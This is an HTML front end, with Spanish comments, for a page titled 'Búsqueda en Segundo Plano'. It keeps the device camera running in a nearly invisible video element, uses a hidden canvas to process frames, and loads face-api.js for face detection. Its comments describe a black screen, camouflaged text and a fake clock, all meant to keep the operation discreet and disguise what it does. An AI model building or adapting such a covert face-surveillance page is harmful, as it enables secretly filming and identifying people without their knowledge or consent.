<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Búsqueda en Segundo Plano</title>
    <!-- Interfaz completamente oscura para operación discreta -->
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000; /* Pantalla negra */
            color: #111; /* Texto casi invisible, se camufla con el fondo */
            font-family: sans-serif;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        /* El video existe pero no se muestra visiblemente al usuario para mantener el modo silencioso */
        #videoElement {
            position: absolute;
            opacity: 0.01; /* Casi invisible, pero el navegador lo requiere renderizado para capturar en móviles */
            width: 10px;
            height: 10px;
            z-index: -1;
        }
        
        /* Canvas oculto para procesar frames */
        #canvasElement {
            display: none; 
        }

        /* Reloj falso muy tenue para disimular */
        #reloj_falso {
            color: #222;
            font-size: 2rem;
            user-select: none;
        }
        
        #btn_iniciar {
            padding: 15px 30px;
            background-color: #333;
            color: #888;
            border: none;
            border-radius: 5px;
            font-size: 1.2rem;
            cursor: pointer;
            z-index: 10;
        }
    </style>
</head>
<body>

    <button id="btn_iniciar">Iniciar Sistema</button>
    <div id="reloj_falso" style="display:none;">00:00</div>

    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasElement"></canvas>

    <!-- Importar face-api.js -->
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.min.js"></script>
    <script src="app.js"></script>
</body>
</html>
